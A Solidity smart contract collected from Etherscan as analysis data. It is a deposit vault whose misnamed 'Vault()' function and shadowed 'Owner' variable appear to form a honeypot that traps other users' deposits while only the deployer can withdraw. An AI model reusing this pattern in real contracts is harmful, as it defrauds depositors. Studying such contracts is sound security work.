/**********************************************************************
*These solidity codes have been obtained from Etherscan for extracting
*the smartcontract related info.
*The data will be used by MATRIX AI team as the reference basis for
*MATRIX model analysis,extraction of contract semantics,
*as well as AI based data analysis, etc.
**********************************************************************/
// Copyright (C) 2017  The Halo Platform by Scott Morrison
//
// This is free software and you are welcome to redistribute it under certain conditions.
// ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
//
pragma solidity ^0.4.13;

contract ForeignToken {
    function balanceOf(address who) constant public returns (uint256);
    function transfer(address to, uint256 amount) public;
}

contract Owned {
    address public Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
}

contract Deposit is Owned {
    address public Owner;
    mapping (address => uint) public Deposits;

    event Deposit(uint amount);
    event Withdraw(uint amount);
    
    function Vault() payable {
        Owner = msg.sender;
        deposit();
    }
    
    function() payable {
        deposit();
    }

    function deposit() payable {
        if (msg.value >= 1 ether) {
            Deposits[msg.sender] += msg.value;
            Deposit(msg.value);
        }
    }

    function kill() {
        if (this.balance == 0)
            selfdestruct(msg.sender);
    }
    
    function withdraw(uint amount) payable onlyOwner {
        if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender]) {
            msg.sender.transfer(amount);
            Withdraw(amount);
        }
    }
    
    function withdrawToken(address token, uint amount) payable onlyOwner {
        uint bal = ForeignToken(token).balanceOf(address(this));
        if (bal >= amount) {
            ForeignToken(token).transfer(msg.sender, amount);
        }
    }
}